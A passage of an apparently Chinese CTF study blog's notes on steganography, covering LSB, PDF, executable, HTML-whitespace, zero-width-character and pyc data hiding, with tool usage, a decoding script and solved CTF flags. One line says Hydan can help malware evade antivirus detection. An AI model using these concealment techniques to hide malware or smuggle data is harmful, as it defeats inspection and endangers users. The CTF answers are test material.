alt="1715250636633-f680ee56-5dc9-41b1-812d-649f51343afe.png"></p><p>在LSB修改法中，8位颜色值的最后一位（最低有效位）由1改为0,由0改为1,或者保待不变</p><p>每个字节的最低有效位的组合表示插入的隐藏内容。如果是文本信息的话，这些最低有效位重新组合后，每8位就代表一个ASCII字符</p><p><img src="/./img/49277317_v2oRw4TQWt61T06K/1715250649542-5a657c8f-d4ac-404a-9284-75e2e413a086-104433.png" alt="1715250649542-5a657c8f-d4ac-404a-9284-75e2e413a086.png"></p><p> 这种隐藏方法通过普通的手段几乎是检测不到的。 通常只有通过统计分析方法才能将其以独立的形式被检测到。 LSB修改后的图像产生的颜色， 肉眼基本上看不出两者的差别。</p><p>通过文件中最低有效位传递消息提供了 一个存储信息的隐藏方法， 而且还不会改变文件</p><p>大小。 对比原始文件和修改后的文件可以发现文件被修改过， 但前提是你手上有原始文件。</p><p>这种修改方法适用于24位的图像文件， 例如JPEG文件和24位的BMP文件。 这类文“</p><p>件格式(ROB图像） 也叫做 “真彩色” 文件格式。LSB修改法同样也适用于8位的BMP图</p><p>像文件，和使用ImageHide时的情况样。利用这种隐写修改法的常用程序有：</p><p>(自我经验：百分之90以上好评的，差不多都可以下)</p><p>S-Tools（找了一圈只有csdn里面可以下载）</p><p>ImageHide（这个在网上可以随便搜到）</p><p>Steganos（也可以搜到）</p><h1 id="五、在PDF文件中隐藏信息"><a href="#五、在PDF文件中隐藏信息" class="headerlink" title="五、在PDF文件中隐藏信息"></a>五、在PDF文件中隐藏信息</h1><h2 id="5-1、介绍："><a href="#5-1、介绍：" class="headerlink" title="5.1、介绍："></a>5.1、介绍：</h2><p>wbStego4open  (<a href="http://wbstego.wbailer.com/">http://wbstego.wbailer.com)</a>) 是一个隐写开源工具， 它支持 Windows 和Linux 平台。 你可以用 wbStego4open 可以把文件隐藏到 BMP、 TXT、 HTM 和 PDF 文件中， 且不会被看出破绽。 还可以用它来创建版权标识文件并嵌入到文件中将其隐藏。 能够允许用户把数据隐藏到 PDF 文件中的隐写程序非常少， 我们打开 wbStego4open 这个隐写程序， 研究下 PDF 文件</p><p><img src="/./img/49277317_v2oRw4TQWt61T06K/1715250674079-a6e42a24-ea26-433b-a17b-7e48aabee0ec-527568.png" alt="1715250674079-a6e42a24-ea26-433b-a17b-7e48aabee0ec.png"></p><h2 id="5-2、原理："><a href="#5-2、原理：" class="headerlink" title="5.2、原理："></a>5.2、原理：</h2><p>这个程序利用 PDF 文件头添加额外信息， 这个区域的信息会被 Adobe Acrobat Reader 阅读器忽略。 此外， wbStego 在插入数据时， 充分利用了插入法和 LSB 修改法两种技术。</p><p>首先 ， wbStego4open 会把插入数据中的每一个 ASCII 码转换为二进制形式， 然后把每一个二进制数字再替换为十六进制的20或者09,20代表0, 09代表1。 例如， 在 wbStego4open的版权管理器 (Copyright Manager) 中， 输入一个包含 “Oblivion” 的地址 ， wbStego4open 就会将其由 ASCII 码转换成相应的二进制码， 然后再用Ox20和Ox09替换每个二进制数</p><p><img src="/./img/49277317_v2oRw4TQWt61T06K/1715250688044-a8c60794-826e-4fe6-9c3c-fa6b9da22bd7-455693.png" alt="1715250688044-a8c60794-826e-4fe6-9c3c-fa6b9da22bd7.png"></p><p>最后， 这些转换后的十六进制数据被嵌入到PDF 文件中。 查看用 wbStego4open 修改后的文</p><p>件内容， 会发现文件中已混入了很多由20和09组成的8位字节（如图3.13所示）。</p><p>把这些 8 位字节取出来后， 再提取其最低有效位， 组合后即可获得其所代表的 ASCII 码的二进制形式， 然后再把二进制码转换成 ASCII 码就能得到原始消息了。</p><h2 id="5-3、wbStego4open"><a href="#5-3、wbStego4open" class="headerlink" title="5.3、wbStego4open"></a>5.3、wbStego4open</h2><p>wbStego4open 确实支持很多其他隐写程序不支持的文件类型 ， 比如 PDF 文件。 实际上， 前面的例子中的 Adobe PDF 文件是有密码保护的。 注意 ， 虽然该文件是有密码保护的， 我们还是成功地修改了这个文件。 这算不上是一种脆弱性 ， 但确实说明 PDF 的安全保护能力有待提高 ，比如 ， 为 PDF 文件进行数字签名， 就可以让接收者知道文件已经被修改过了。 密码保护主要用来防止打印或者复制AdobePDF文件的内容， 而数字证书则可以防止文件内容被篡改。 拥有数字证书的PDF文件内容其实是可以修改的， 但会提示接收者文件已经被修改过了， 不要相信其中的内容</p><p>wbStego4open使用方法：</p><p>【PDF隐写】wbStego4open，且还包括BMP、 TXT、 HTM文件隐写<a href="https://blog.csdn.net/qq_53079406/article/details/123783006?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_53079406&#x2F;article&#x2F;details&#x2F;123783006?spm&#x3D;1001.2014.3001.5501</a></p><p><a href="https://blog.csdn.net/qq_53079406/article/details/123783006?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_53079406&#x2F;article&#x2F;details&#x2F;123783006?spm&#x3D;1001.2014.3001.5501</a></p><h1 id="六、在可执行文件中隐藏信息"><a href="#六、在可执行文件中隐藏信息" class="headerlink" title="六、在可执行文件中隐藏信息"></a>六、在可执行文件中隐藏信息</h1><p>Hydan</p><h2 id="6-1、介绍："><a href="#6-1、介绍：" class="headerlink" title="6.1、介绍："></a>6.1、介绍：</h2><p>使用Hydan这个工具可以在可执行文件中隐藏数据</p><p>Hydan 有时候会引入运行时错误， 因此它并不是一个完全允许误操作的傻瓜软件， 但它的数据隐藏能力确实不错。 Hydan 隐藏数据的效率并没有那些用来在图像和音频文件中隐藏数据的技术高。 由千二进制文件中插入隐藏内容的机会和空间很小， 因此二进制文件中可用于隐藏的字节比率比图像文件低很多。 然而， 这是可以逃脱一般和受过专业训练的检查人员法眼隐藏数据的唯一方法。  很多隐写分析软件（都没有检测出用 Hydan 在可执行文件中隐藏的数据。</p><h2 id="6-2、原理："><a href="#6-2、原理：" class="headerlink" title="6.2、原理："></a>6.2、原理：</h2><p> Hydan利用二进制代码的反向工程技术来判断在可执行文件中隐藏数据段的最佳位置。 这个过程中还使用了一个x86反编译库： Mammon’s Libdisasm。 二进制文件（可执行文件）中可以用来隐藏数据的空间很小 一个JPEG图像文件中每17个字节中可以隐藏一个字节数据，而二进制文件（可执行文件）中每150字节的代码才可以隐藏一个字节。 可见， 在确保修改后的宿主二进制文件仍然可以完好运行的前提下去修改它是一个非常小心谨慎的过程。</p><p>Hydan可以在很多Linux和FreeBSD的发行版中运行。 像 “tar” 可执行程序使用Hydan在文件中隐藏信息。</p><h2 id="6-3、利用："><a href="#6-3、利用：" class="headerlink" title="6.3、利用："></a>6.3、利用：</h2><p>用 hydan 修改 tar 并生成了一个新的可执行文件 tar. steg, 并通过执行打包命令测试了它的数据隐藏能力， 发现新文件的运行结果和原来的 tar 是一样的。 Hydan 的这个工具不仅展示了它在可执行文件中隐藏数据的有效性， 还展示了它的简单易用性。 此外， Hydan 还能用来附加数字签名、 嵌入水印和修改恶意软件以逃避防病毒软件的检测。</p><h2 id="6-4、官网："><a href="#6-4、官网：" class="headerlink" title="6.4、官网："></a>6.4、官网：</h2><p><a href="http://www.crazyboy.com/hydan8">http://www.crazyboy.com/hydan8</a>（现在已经没了，打不开了）</p><p>最后更新04年，支持32操作系统</p><h1 id="七、在HTML文件中隐藏信息"><a href="#七、在HTML文件中隐藏信息" class="headerlink" title="七、在HTML文件中隐藏信息"></a>七、在HTML文件中隐藏信息</h1><p>Snow</p><h2 id="7-1、介绍："><a href="#7-1、介绍：" class="headerlink" title="7.1、介绍："></a>7.1、介绍：</h2><p>Snow是 Mattehew Kwan 开发的软件， 它可以在 ASCII 文本的末行隐藏数据， 并且可以通过插入制表位和空格使嵌入的数据在浏览器中不可见。 Snow 支持ICE (Information Concealment Engine) 加密。 最初是为 DOS 开发的， 现在已经成为开源的。</p><p>Snow 的man 手册中讲到 “通过在文本文件末尾追加由制表位隔开的空格可以实现数据隐藏， 最多可以添加 7 个空格， 这使得每 8 列可以嵌入 3 位” 。</p><h2 id="7-2、使用"><a href="#7-2、使用" class="headerlink" title="7.2、使用"></a>7.2、使用</h2><h2 id="安装、使用方法："><a href="#安装、使用方法：" class="headerlink" title="安装、使用方法："></a>安装、使用方法：</h2><p>【HTML中隐写】Snow免安装、网站版，基本使用方法</p><p><a href="https://blog.csdn.net/qq_53079406/article/details/123810053?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165167325616782395311979%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=165167325616782395311979&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-123810053.nonecase&utm_term=snow&spm=1018.2226.3001.4450">https://blog.csdn.net/qq_53079406&#x2F;article&#x2F;details&#x2F;123810053?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522165167325616782395311979%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id&#x3D;165167325616782395311979&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>blog</del>first_rank_ecpm_v1~rank_v31_ecpm-1-123810053.nonecase&amp;utm_term&#x3D;snow&amp;spm&#x3D;1018.2226.3001.4450</a></p><h2 id="从命令行中运行该工具："><a href="#从命令行中运行该工具：" class="headerlink" title="从命令行中运行该工具："></a>从命令行中运行该工具：</h2><p>C:&gt;snow.exe -C -m “aaaaaaaaaaaaaaaa” -p “zzzzzzzz” SpyHunter.htm </p><p>SpyHunterwithsnow.htm </p><p>Compressed by 50.00% </p><p>Message.used approximately 4.18% of available space. </p><p>对比原始HTML文件和嵌入数据的文件，视觉上没有任何差别</p><p>实际上，用HTML浏览器查看文件，也看不出明显的被嵌入数据的痕迹。只有通过文件对比才能发现数据嵌入痕迹，整个文件中会有很多制表位和空格</p><blockquote><p>更新: 2024-05-09 18:31:38<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/sbhosgcrbwpa0ii4">https://www.yuque.com/chaye-apqbl/vsc85q/sbhosgcrbwpa0ii4</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="文档隐写"><a href="#文档隐写" class="headerlink" title="文档隐写"></a>文档隐写</h1><blockquote><p>更新: 2024-07-22 09:08:23<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/coa5uquh4qhh1opo">https://www.yuque.com/chaye-apqbl/vsc85q/coa5uquh4qhh1opo</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E6%96%87%E6%9C%AC%E9%9A%90%E5%86%99%EF%BC%88txt%E9%9B%B6%E5%AE%BD%E5%BA%A6%E9%9A%90%E5%86%99%EF%BC%89/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E6%96%87%E6%9C%AC%E9%9A%90%E5%86%99%EF%BC%88txt%E9%9B%B6%E5%AE%BD%E5%BA%A6%E9%9A%90%E5%86%99%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="文本隐写（txt零宽度隐写）"><a href="#文本隐写（txt零宽度隐写）" class="headerlink" title="文本隐写（txt零宽度隐写）"></a>文本隐写（txt零宽度隐写）</h1><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><font style="color:rgb(77, 77, 77);">零宽度字符是一种字节宽度为0的不可打印的</font><a href="https://so.csdn.net/so/search?q=Unicode&spm=1001.2101.3001.7020">Unicode</a><font style="color:rgb(77, 77, 77);">字符, 在浏览器等环境不可见, 但是真是存在, 获取字符串长度时也会占位置, 表示某一种控制功能的字符。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">零宽空格（zero-width space, ZWSP）用于可能需要换行处。<br>    Unicode: U+200B  HTML: &amp;#8203;<br>零宽不连字 (zero-width non-joiner，ZWNJ)放在电子文本的两个字符之间，抑制本来会发生的连字，而是以这两个字符原本的字形来绘制。<br>    Unicode: U+200C  HTML: &amp;#8204;<br>零宽连字（zero-width joiner，ZWJ）是一个控制字符，放在某些需要复杂排版语言（如阿拉伯语、印地语）的两个字符之间，使得这两个本不会发生连字的字符产生了连字效果。<br>    Unicode: U+200D  HTML: &amp;#8205;<br>左至右符号（Left-to-right mark，LRM）是一种控制字符，用于计算机的双向文稿排版中。<br>    Unicode: U+200E  HTML: &amp;lrm; &amp;#x200E; 或&amp;#8206;<br>右至左符号（Right-to-left mark，RLM）是一种控制字符，用于计算机的双向文稿排版中。<br>    Unicode: U+200F  HTML: &amp;rlm; &amp;#x200F; 或&amp;#8207;<br>字节顺序标记（byte-order mark，BOM）常被用来当做标示文件是以UTF-8、UTF-16或UTF-32编码的标记。<br>    Unicode: U+FEFF<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_DpKApp1EsmpU-RZF/1727169730063-ac38b178-af87-4b96-a7e5-824df088a345-767953.png" alt="1727169730063-ac38b178-af87-4b96-a7e5-824df088a345.png"></p><p><font style="color:rgb(77, 77, 77);">我们能看到的只有六个字，但是显示的length有34，零宽度字符就会产生这个效果，他不影响阅读，但是真实存在，也会占长度。</font></p><p><font style="color:rgb(77, 77, 77);">虽然我们看到的样子是上面这个样子，但是实际上他是下面这个样子~</font></p><p><img src="/./img/49277317_DpKApp1EsmpU-RZF/1727169771601-c13d9c9f-e824-4b39-a4bb-dc32997c2495-403751.png" alt="1727169771601-c13d9c9f-e824-4b39-a4bb-dc32997c2495.png"></p><p><img src="/./img/49277317_DpKApp1EsmpU-RZF/1727169779897-bd10d910-2812-4fdc-a278-973cc94228e9-631305.png" alt="1727169779897-bd10d910-2812-4fdc-a278-973cc94228e9.png"></p><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><p><img src="/./img/49277317_DpKApp1EsmpU-RZF/1727169806784-458d8dc8-1ad2-48a5-9f19-275be57a26c6-305516.png" alt="1727169806784-458d8dc8-1ad2-48a5-9f19-275be57a26c6.png"></p><p><font style="color:rgb(77, 77, 77);">蓝色的就是零宽度字符啦</font></p><p><font style="color:rgb(77, 77, 77);"></font></p><p><img src="/./img/49277317_DpKApp1EsmpU-RZF/1727170020099-34815226-2a05-432e-84a5-d1d74795feeb-126512.png" alt="1727170020099-34815226-2a05-432e-84a5-d1d74795feeb.png"></p><h2 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h2><p><a href="https://tool.bfw.wiki/tool/1695021695027599.html">https://tool.bfw.wiki/tool/1695021695027599.html</a></p><p><a href="https://www.hanloth.cn/tool/zero-width-secret">零宽文本加解密工具 - 翰络云工具 (hanloth.cn)</a>（推荐这个）</p><p><a href="https://www.mzy0.com/ctftools/zerowidth1/">Unicode Steganography with Zero-Width Characters (mzy0.com)</a>（有200f）</p><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters (330k.github.io)</a></p><p><a href="https://offdev.net/demos/zwsp-steg-js">Offdev.net - Zero-width space steganography javascript demo</a></p><h2 id="自定义零宽-提取一下16进制f3a084和f3a85"><a href="#自定义零宽-提取一下16进制f3a084和f3a85" class="headerlink" title="自定义零宽 提取一下16进制f3a084和f3a85"></a>自定义零宽 提取一下16进制f3a084和f3a85</h2><p><a href="https://www.yuque.com/attachments/yuque/0/2025/txt/42988179/1748398069884-6b075b74-321f-4a7d-9155-2bd496eddb0a.txt">hidden-word.txt</a></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs markdown">def process<span class="hljs-emphasis">_file(input_</span>file, output<span class="hljs-emphasis">_file):</span><br><span class="hljs-emphasis">    with open(input_</span>file, &#x27;rb&#x27;) as f<span class="hljs-emphasis">_in, open(output_</span>file, &#x27;wb&#x27;) as f<span class="hljs-emphasis">_out:</span><br><span class="hljs-emphasis">        data = f_</span>in.read()<br><span class="hljs-code">        i = 0</span><br><span class="hljs-code">        while i &lt; len(data) - 3:  # 需要至少4字节: f3 a0 (84/85) XX</span><br><span class="hljs-code">            # 检查是否匹配 0xf3 0xa0</span><br><span class="hljs-code">            if data[i] == 0xf3 and data[i+1] == 0xa0:</span><br><span class="hljs-code">                opcode = data[i+2]</span><br><span class="hljs-code">                </span><br><span class="hljs-code">                # 确定要加的值</span><br><span class="hljs-code">                if opcode == 0x85:</span><br><span class="hljs-code">                    add_value = 0xd0</span><br><span class="hljs-code">                elif opcode == 0x84:</span><br><span class="hljs-code">                    add_value = 0x90</span><br><span class="hljs-code">                else:</span><br><span class="hljs-code">                    i += 1</span><br><span class="hljs-code">                    continue</span><br><span class="hljs-code">                </span><br><span class="hljs-code">                # 处理下一个字节</span><br><span class="hljs-code">                if i + 3 &lt; len(data):</span><br><span class="hljs-code">                    original_byte = data[i+3]</span><br><span class="hljs-code">                    result_byte = (original_byte + add_value) % 256  # 防止溢出</span><br><span class="hljs-code">                    f_out.write(bytes([result_byte]))</span><br><span class="hljs-code">                </span><br><span class="hljs-code">                i += 4  # 跳过已处理的4字节</span><br><span class="hljs-code">            else:</span><br><span class="hljs-code">                i += 1</span><br><span class="hljs-code"></span><br>process<span class="hljs-emphasis">_file(&#x27;hidden-word.txt&#x27;, &#x27;flag.txt&#x27;)</span><br><span class="hljs-emphasis">print(&quot;处理完成！结果字节已保存到flag.txt&quot;)</span><br></code></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><a href="https://blog.csdn.net/qq_45927266/article/details/120423818">零宽字符隐写——2021网刃杯CTF 签到_零宽隐写-CSDN博客</a></p><p><a href="https://www.cnblogs.com/Hardworking666/p/15866091.html">零宽度字符隐写（CTF） - Hardworking666 - 博客园 (cnblogs.com)</a></p><h2 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h2><p>发现显示长度与所见长度不合，是txt零宽度隐写</p><p><img src="/./img/49277317_DpKApp1EsmpU-RZF/1727168251957-d17c4a2d-ff0e-411f-8e4e-a8acf25a58b1-717553.png" alt="1727168251957-d17c4a2d-ff0e-411f-8e4e-a8acf25a58b1.png"></p><p>放入kali里面</p><p>用vi +文件名 命令打开<img src="/./img/49277317_DpKApp1EsmpU-RZF/1727168212851-04de2979-eb96-48e1-8f5a-fd9449e6a4f0-487779.png" alt="1727168212851-04de2979-eb96-48e1-8f5a-fd9449e6a4f0.png"></p><p><font style="color:rgb(77, 77, 77);">很明显是零宽度字符</font><a href="https://so.csdn.net/so/search?q=%E9%9A%90%E5%86%99&spm=1001.2101.3001.7020">隐写</a><font style="color:rgb(77, 77, 77);">，在上面有找到4种零宽度字符，使用在线解密工具进行解密</font></p><p><a href="https://www.hanloth.cn/tool/zero-width-secret">零宽文本加解密工具 - 翰络云工具 (hanloth.cn)</a></p><p><font style="color:rgb(77, 77, 77);">有feff、200f、200e、200b、200c</font></p><p><img src="/./img/49277317_DpKApp1EsmpU-RZF/1727174345421-21bd6add-c6c8-4528-9d50-03afd004a79c-204833.png" alt="1727174345421-21bd6add-c6c8-4528-9d50-03afd004a79c.png"></p><p>拿到密码，解一下佛教</p><p><img src="/./img/49277317_DpKApp1EsmpU-RZF/1727174412482-f9b917d8-64a0-4aa9-a371-e0230afaf594-538412.png" alt="1727174412482-f9b917d8-64a0-4aa9-a371-e0230afaf594.png"></p><p><img src="/./img/49277317_DpKApp1EsmpU-RZF/1727174715148-c4347e29-2891-44be-94b6-7254ae174181-060790.png" alt="1727174715148-c4347e29-2891-44be-94b6-7254ae174181.png"></p><p><font style="color:rgb(77, 77, 77);"></font></p><blockquote><p>更新: 2025-10-31 15:27:15<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gbn435ihvmwgudak">https://www.yuque.com/chaye-apqbl/vsc85q/gbn435ihvmwgudak</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/pyc%E9%9A%90%E5%86%99%EF%BC%88kali%E4%B8%8B%E4%BD%BF%E7%94%A8%EF%BC%89/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/pyc%E9%9A%90%E5%86%99%EF%BC%88kali%E4%B8%8B%E4%BD%BF%E7%94%A8%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="pyc隐写（kali下使用）"><a href="#pyc隐写（kali下使用）" class="headerlink" title="pyc隐写（kali下使用）"></a>pyc隐写（kali下使用）</h1><p><a href="https://blog.csdn.net/luochen2436/article/details/123376678">https://blog.csdn.net/luochen2436/article/details/123376678</a></p><p>使用这个工具</p><p><a href="https://github.com/AngelKitty/stegosaurus">https://github.com/AngelKitty/stegosaurus</a></p><p>在kali下面使用</p><p>.\stegosaurus 1.pyc -x</p><p><img src="/./img/DlQkDb2J-qpPSZb0/1747121984197-6e4e1536-0734-485e-9788-5ded207ec38b-240993.png" alt="1747121984197-6e4e1536-0734-485e-9788-5ded207ec38b.png"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown">$ python3 -m stegosaurus -h<br><br><span class="hljs-code">    usage: stegosaurus.py [-h] [-p PAYLOAD] [-r] [-s] [-v] [-x] carrier</span><br><span class="hljs-code">    </span><br><span class="hljs-code">    positional arguments:</span><br><span class="hljs-code">      carrier               Carrier py, pyc or pyo file</span><br><span class="hljs-code">    </span><br><span class="hljs-code">    optional arguments:</span><br><span class="hljs-code">      -h, --help            show this help message and exit</span><br><span class="hljs-code">      -p PAYLOAD, --payload PAYLOAD</span><br><span class="hljs-code">                            Embed payload in carrier file</span><br><span class="hljs-code">      -r, --report          Report max available payload size carrier supports</span><br><span class="hljs-code">      -s, --side-by-side    Do not overwrite carrier file, install side by side</span><br><span class="hljs-code">                            instead.</span><br><span class="hljs-code">      -v, --verbose         Increase verbosity once per use</span><br><span class="hljs-code">      -x, --extract         Extract payload from carrier file</span><br></code></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="校赛（四杀-qetx）"><a href="#校赛（四杀-qetx）" class="headerlink" title="校赛（四杀-qetx）"></a>校赛（四杀-qetx）</h2><p><a href="https://github.com/AngelKitty/stegosaurus">https://github.com/AngelKitty/stegosaurus</a></p><p><img src="/./img/DlQkDb2J-qpPSZb0/1747123365152-909bc104-cbf9-4a89-afc7-31e4b47e64c5-424487.png" alt="1747123365152-909bc104-cbf9-4a89-afc7-31e4b47e64c5.png"></p><p>得到key：huTy1@</p><p><img src="/./img/DlQkDb2J-qpPSZb0/1747123404576-eb565172-cd61-4135-a9d9-5bdd3e100b29-907032.png" alt="1747123404576-eb565172-cd61-4135-a9d9-5bdd3e100b29.png"></p><p>flag{qetx’s_JETT_1S_S0oo0oo_Wanderfu1!!!}</p><blockquote><p>更新: 2025-05-13 16:04:40<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ekmq31mxrelgiyw8">https://www.yuque.com/chaye-apqbl/vsc85q/ekmq31mxrelgiyw8</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/grep%E6%8C%87%E4%BB%A4/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/grep%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="grep指令"><a href="#grep指令" class="headerlink" title="grep指令"></a>grep指令</h1><p><a href="https://www.runoob.com/linux/linux-comm-grep.html">Linux grep 命令 | 菜鸟教程 (runoob.com)</a></p><p>直接查找符合字符</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a><font style="color:rgb(51, 51, 51);">语法</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">grep [options] pattern [files]<br><br>grep [-abcEFGhHilLnqrsvVwxy][-A&lt;显示行数&gt;][-B&lt;显示列数&gt;][-C&lt;显示列数&gt;][-d&lt;进行动作&gt;][-e&lt;范本样式&gt;][-f&lt;范本文件&gt;][--help][范本样式][文件或目录...]<br></code></pre></td></tr></table></figure><ul><li><font style="color:rgb(51, 51, 51);">pattern - 表示要查找的字符串或正则表达式。</font></li><li><font style="color:rgb(51, 51, 51);">files - 表示要查找的文件名，可以同时查找多个文件，如果省略 files 参数，则默认从标准输入中读取数据。</font></li></ul><p><strong><font style="color:rgb(51, 51, 51);">常用选项：</font></strong><font style="color:rgb(51, 51, 51);">：</font></p><ul><li><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;-i&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">：忽略大小写进行匹配。</font></li><li><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;-v&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">：反向查找，只打印不匹配的行。</font></li><li><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;-n&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">：显示匹配行的行号。</font></li><li><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;-r&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">：递归查找子目录中的文件。</font></li><li><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;-l&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">：只打印匹配的文件名。</font></li><li><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;-c&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">：只打印匹配的行数。</font></li></ul><p><strong><font style="color:rgb(51, 51, 51);">更多参数说明</font></strong><font style="color:rgb(51, 51, 51);">：</font></p><ul><li><strong><font style="color:rgb(51, 51, 51);">-a 或 –text</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 不要忽略二进制的数据。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-A&lt;显示行数&gt; 或 –after-context&#x3D;&lt;显示行数&gt;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 除了显示符合范本样式的那一列之外，并显示该行之后的内容。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-b 或 –byte-offset</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 在显示符合样式的那一行之前，标示出该行第一个字符的编号。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-B&lt;显示行数&gt; 或 –before-context&#x3D;&lt;显示行数&gt;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 除了显示符合样式的那一行之外，并显示该行之前的内容。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-c 或 –count</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 计算符合样式的列数。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-C&lt;显示行数&gt; 或 –context&#x3D;&lt;显示行数&gt;或-&lt;显示行数&gt;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 除了显示符合样式的那一行之外，并显示该行之前后的内容。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-d &lt;动作&gt; 或 –directories&#x3D;&lt;动作&gt;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 当指定要查找的是目录而非文件时，必须使用这项参数，否则grep指令将回报信息并停止动作。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-e&lt;范本样式&gt; 或 –regexp&#x3D;&lt;范本样式&gt;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 指定字符串做为查找文件内容的样式。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-E 或 –extended-regexp</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 将样式为延伸的正则表达式来使用。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-f&lt;规则文件&gt; 或 –file&#x3D;&lt;规则文件&gt;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 